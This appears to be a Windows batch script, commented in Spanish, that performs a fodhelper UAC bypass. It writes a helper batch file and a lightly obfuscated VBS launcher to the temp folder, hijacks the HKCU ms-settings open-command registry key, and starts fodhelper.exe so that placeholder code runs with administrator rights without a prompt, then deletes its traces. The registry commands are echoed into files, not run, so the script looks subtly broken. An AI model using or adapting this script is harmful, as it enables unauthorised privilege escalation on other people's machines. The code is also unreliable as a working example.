@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    goto :elevate
) else (
    echo El script ya se está ejecutando con privilegios de administrador.
    REM ADD Your code below
    pause
    exit /b 0
)

:elevate
cd %temp%

REM Crear archivo batch con manejo de errores
(
echo @echo off
echo if exist "%~f0" (
echo     call "%~f0"
echo     exit /b 0
echo ) else (
echo     echo Error: El archivo original no se encuentra.
echo     exit /b 1
echo )
)>help.bat

if not exist help.bat (
    echo Error al crear help.bat
    exit /b 1
)

REM Crear script VBS con ofuscación básica y manejo de errores
echo Set fso = CreateObject("Scripting.FileSystemObject") >> run.vbs
echo On Error Resume Next >> run.vbs
echo Set oShell = CreateObject("WScript.Shell") >> run.vbs
echo cmdToRun = "%TEMP%\help.bat" >> run.vbs
echo oShell.Run cmdToRun, 0, False >> run.vbs
echo If Err.Number <> 0 Then >> run.vbs
echo    MsgBox "Error al ejecutar el script con privilegios elevados: " ^& Err.Description, vbCritical >> run.vbs
echo End If >> run.vbs
echo Set oShell = Nothing >> run.vbs
echo Set fso = Nothing >> run.vbs

if not exist run.vbs (
    echo Error al crear run.vbs
    exit /b 1
)

set "payload=wscript.exe %temp%\run.vbs"
echo Payload: %payload%

REM Agregar claves de registro con manejo de errores
echo reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "%payload%" /f > reg_add_output.txt
for /f "tokens=3" %%a in ('type reg_add_output.txt ^| findstr "La operación se completó"') do set reg_add_status_command=%%a
del reg_add_output.txt
if not defined reg_add_status_command (
    echo Error al agregar la clave de registro para el comando.
    goto :cleanup
)

echo reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f > reg_add_output.txt
for /f "tokens=3" %%a in ('type reg_add_output.txt ^| findstr "La operación se completó"') do set reg_add_status_delegate=%%a
del reg_add_output.txt
if not defined reg_add_status_delegate (
    echo Error al agregar la clave de registro DelegateExecute.
    goto :cleanup
)

REM Ejecutar fodhelper.exe y verificar si se ejecutó correctamente
start "" fodhelper.exe
timeout /t 5 /nobreak >nul

REM Verificar si la elevación tuvo éxito (esto es una comprobación simple, podría ser más robusta)
net session >nul 2>&1
if %errorlevel% equ 0 (
    echo Script ejecutado con privilegios de administrador.
    mshta vbscript:Execute("MsgBox ""Elevación de privilegios exitosa."",vbInformation:close")
    REM Aquí iría el código que se ejecuta con privilegios elevados
    pause
) else (
    echo Fallo en la elevación de privilegios.
    mshta vbscript:Execute("MsgBox ""Fallo en la elevación de privilegios."",vbExclamation:close")
)

:cleanup
REM Limpiar las entradas de registro con manejo de errores
echo reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f > reg_delete_output.txt
for /f "tokens=3" %%a in ('type reg_delete_output.txt ^| findstr "La operación se completó"') do set reg_delete_status=%%a
del reg_delete_output.txt
if not defined reg_delete_status (
    echo Error al eliminar las entradas de registro.
)

del help.bat
del run.vbs
exit /b 0
